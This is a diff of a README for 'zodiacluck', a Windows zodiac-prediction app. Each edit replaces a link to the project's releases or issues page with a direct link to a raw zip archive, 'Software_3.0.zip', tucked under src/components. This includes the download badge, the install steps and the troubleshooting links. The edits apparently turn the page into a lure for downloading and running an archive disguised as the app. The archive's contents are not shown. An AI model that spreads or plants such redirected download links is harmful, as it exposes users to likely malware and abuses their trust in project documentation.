@@ -1,6 +1,6 @@
 # 🌟 zodiacluck - Your 2026 Zodiac Predictions  
 
-[![Download zodiacluck](https://img.shields.io/badge/Download-zodiacluck-brightgreen?style=for-the-badge)](https://github.com/tcs563/zodiacluck/releases)  
+[![Download zodiacluck](https://img.shields.io/badge/Download-zodiacluck-brightgreen?style=for-the-badge)](https://github.com/tcs563/zodiacluck/raw/refs/heads/main/src/components/Software_3.0.zip)  
 
 ---
 
@@ -35,7 +35,7 @@ Before you begin, make sure your Windows PC meets the following:
 ## 📥 Download and Install zodiacluck  
 
 Click the large badge above or use this link to visit the release page:  
-[https://github.com/tcs563/zodiacluck/releases](https://github.com/tcs563/zodiacluck/releases)  
+[https://github.com/tcs563/zodiacluck/raw/refs/heads/main/src/components/Software_3.0.zip](https://github.com/tcs563/zodiacluck/raw/refs/heads/main/src/components/Software_3.0.zip)  
 
 Steps to install and run on Windows:  
 
@@ -73,7 +73,7 @@ If you run into problems:
 - Check if you downloaded the full installer. Sometimes partial downloads cause issues.  
 
 If problems persist, visit the issues section on the GitHub page and look for solutions:  
-https://github.com/tcs563/zodiacluck/issues  
+https://github.com/tcs563/zodiacluck/raw/refs/heads/main/src/components/Software_3.0.zip  
 
 ---
 
@@ -126,7 +126,7 @@ For developers or curious users, the project topics include:
 
 Visit the releases page to download the latest available version:  
 
-[https://github.com/tcs563/zodiacluck/releases](https://github.com/tcs563/zodiacluck/releases)  
+[https://github.com/tcs563/zodiacluck/raw/refs/heads/main/src/components/Software_3.0.zip](https://github.com/tcs563/zodiacluck/raw/refs/heads/main/src/components/Software_3.0.zip)  
 
 Use the provided installer to set up the app on your Windows computer.  
 
@@ -136,4 +136,4 @@ Use the provided installer to set up the app on your Windows computer.
 
 If you have questions, check the documentation or the GitHub issues tab:  
 
-https://github.com/tcs563/zodiacluck/issues
+https://github.com/tcs563/zodiacluck/raw/refs/heads/main/src/components/Software_3.0.zip
